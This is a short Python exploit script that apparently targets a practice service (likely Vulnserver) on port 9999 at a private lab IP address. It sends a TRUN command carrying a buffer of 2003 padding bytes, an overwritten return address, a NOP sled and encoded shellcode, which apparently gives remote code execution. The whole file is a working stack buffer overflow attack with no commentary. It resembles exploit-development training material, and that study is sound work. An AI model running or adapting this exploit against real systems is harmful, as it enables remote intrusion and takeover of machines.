#!/usr/bin/python

import sys, socket
import struct

host = "192.168.1.213"
port = 9999

overflow =  b""
overflow += b"\xda\xd7\xbf\x2c\x3e\x14\xcb\xd9\x74\x24\xf4\x5a"
overflow += b"\x33\xc9\xb1\x52\x31\x7a\x17\x03\x7a\x17\x83\xee"
overflow += b"\x3a\xf6\x3e\x12\xaa\x74\xc0\xea\x2b\x19\x48\x0f"
overflow += b"\x1a\x19\x2e\x44\x0d\xa9\x24\x08\xa2\x42\x68\xb8"
overflow += b"\x31\x26\xa5\xcf\xf2\x8d\x93\xfe\x03\xbd\xe0\x61"
overflow += b"\x80\xbc\x34\x41\xb9\x0e\x49\x80\xfe\x73\xa0\xd0"
overflow += b"\x57\xff\x17\xc4\xdc\xb5\xab\x6f\xae\x58\xac\x8c"
overflow += b"\x67\x5a\x9d\x03\xf3\x05\x3d\xa2\xd0\x3d\x74\xbc"
overflow += b"\x35\x7b\xce\x37\x8d\xf7\xd1\x91\xdf\xf8\x7e\xdc"
overflow += b"\xef\x0a\x7e\x19\xd7\xf4\xf5\x53\x2b\x88\x0d\xa0"
overflow += b"\x51\x56\x9b\x32\xf1\x1d\x3b\x9e\x03\xf1\xda\x55"
overflow += b"\x0f\xbe\xa9\x31\x0c\x41\x7d\x4a\x28\xca\x80\x9c"
overflow += b"\xb8\x88\xa6\x38\xe0\x4b\xc6\x19\x4c\x3d\xf7\x79"
overflow += b"\x2f\xe2\x5d\xf2\xc2\xf7\xef\x59\x8b\x34\xc2\x61"
overflow += b"\x4b\x53\x55\x12\x79\xfc\xcd\xbc\x31\x75\xc8\x3b"
overflow += b"\x35\xac\xac\xd3\xc8\x4f\xcd\xfa\x0e\x1b\x9d\x94"
overflow += b"\xa7\x24\x76\x64\x47\xf1\xd9\x34\xe7\xaa\x99\xe4"
overflow += b"\x47\x1b\x72\xee\x47\x44\x62\x11\x82\xed\x09\xe8"
overflow += b"\x45\xd2\x66\xf3\x4d\xba\x74\xf3\x78\x88\xf0\x15"
overflow += b"\xe8\xfe\x54\x8e\x85\x67\xfd\x44\x37\x67\x2b\x21"
overflow += b"\x77\xe3\xd8\xd6\x36\x04\x94\xc4\xaf\xe4\xe3\xb6"
overflow += b"\x66\xfa\xd9\xde\xe5\x69\x86\x1e\x63\x92\x11\x49"
overflow += b"\x24\x64\x68\x1f\xd8\xdf\xc2\x3d\x21\xb9\x2d\x85"
overflow += b"\xfe\x7a\xb3\x04\x72\xc6\x97\x16\x4a\xc7\x93\x42"
overflow += b"\x02\x9e\x4d\x3c\xe4\x48\x3c\x96\xbe\x27\x96\x7e"
overflow += b"\x46\x04\x29\xf8\x47\x41\xdf\xe4\xf6\x3c\xa6\x1b"
overflow += b"\x36\xa9\x2e\x64\x2a\x49\xd0\xbf\xee\x69\x33\x15"
overflow += b"\x1b\x02\xea\xfc\xa6\x4f\x0d\x2b\xe4\x69\x8e\xd9"
overflow += b"\x95\x8d\x8e\xa8\x90\xca\x08\x41\xe9\x43\xfd\x65"
overflow += b"\x5e\x63\xd4"
#625011AF
ret_addr = struct.pack("<L", 0x625011af)

shellcode = "A" * 2003 + ret_addr + "\x90" * 10 + overflow

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	print("Connecting to host")
	s.connect((host,port))
	print("connected")
	s.send(('TRUN /.:/' + shellcode))
	print("sent")
	s.close()

except:

	print "Error connecting to server"
	sys.exit()
